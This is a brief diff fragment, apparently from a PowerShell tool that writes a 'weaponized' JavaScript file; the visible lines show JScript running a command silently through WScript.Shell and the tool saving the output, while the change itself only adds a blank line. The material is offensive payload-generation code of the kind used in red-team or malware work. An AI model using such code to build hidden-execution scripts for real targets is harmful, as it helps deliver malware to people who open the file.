@@ -80,3 +80,4 @@ r = new ActiveXObject("WScript.Shell").Run(c,0,true);
     Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default
     Write-Output "Weaponized JS file written to $OutputPath"
 }
+
